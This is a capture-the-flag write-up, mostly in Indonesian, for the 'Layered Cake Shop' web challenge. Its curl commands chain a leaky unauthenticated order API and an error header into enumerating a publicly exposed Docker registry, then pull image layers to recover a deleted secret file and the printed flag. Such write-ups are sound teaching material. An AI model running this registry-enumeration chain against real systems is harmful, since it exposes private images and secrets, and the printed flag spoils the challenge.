# Layered Cake Shop Writeup

## Challenge
- Name: `Layered Cake Shop`
- Prompt: *I would really love to make Cannavaiolo's cake at home! Could you find the secret ingredients for me?*
- Target: `http://chall.k1nd4sus.it:30509`

## Ringkasan Kerentanan
- `GET /api/orders/<orderId>` bisa diakses tanpa auth dan membocorkan field `debug` untuk order gagal.
- Field `debug.buildLog` membocorkan build image ID internal: `cake-2026-04-3e57c0`.
- `GET /api/cakes/<name>/preview` pada value tertentu memicu error 500 yang mengungkap header internal:
  - `X-Service: image-builder`
  - `X-Upstream-Url: https://supersecureregistry.k1nd4sus.it/v2/`
- Docker Registry internal bisa diakses publik (`/v2/_catalog`, `/tags/list`, `/manifests`, `/blobs`).
- Layer image menyimpan file sensitif (`/app/secret_recipe.txt`) di layer tengah walaupun dihapus di layer akhir (masih bisa diekstrak dari blob layer).

## Langkah Eksploit (Manual)

1. Ambil order gagal awal:
```bash
curl -s http://chall.k1nd4sus.it:30509/api/orders/ORD-2026-04-0001 | jq .
```
Output penting:
- `customer: "cannavaiolo"`
- `debug.buildLog: "failed to build image cake-2026-04-3e57c0 ..."`

2. Trigger preview pakai `build id` untuk leak upstream:
```bash
curl -i -s http://chall.k1nd4sus.it:30509/api/cakes/cake-2026-04-3e57c0/preview
```
Header penting:
- `X-Upstream-Url: https://supersecureregistry.k1nd4sus.it/v2/`

3. Enumerasi registry:
```bash
curl -s https://supersecureregistry.k1nd4sus.it/v2/_catalog | jq .
curl -s https://supersecureregistry.k1nd4sus.it/v2/cakes/cannavaiolo/tags/list | jq .
```
Tag penting:
- `cake-2026-04-3e57c0-prod`

4. Ambil manifest OCI:
```bash
curl -s \
  -H 'Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.v2+json' \
  https://supersecureregistry.k1nd4sus.it/v2/cakes/cannavaiolo/manifests/cake-2026-04-3e57c0-prod | jq .
```

5. Download layer blob lalu cari flag/secret:
```bash
curl -s https://supersecureregistry.k1nd4sus.it/v2/cakes/cannavaiolo/blobs/<layer-digest> -o layer.gz
gzip -dc layer.gz | strings | grep -E 'KSUS\{.*\}'
```

## Flag
```text
KSUS{Th1s_C4k3_T4sT3s_L1k3_a_Sl4P}
```

## Solver Otomatis
Gunakan script:
```bash
python3 solver.py
```
Script melakukan:
- Pivot dari order gagal
- Leak upstream registry dari header preview error
- Resolve repo+tag berdasarkan customer + build id
- Pull manifest OCI dan semua layer
- Regex `KSUS{...}` dari blob layer
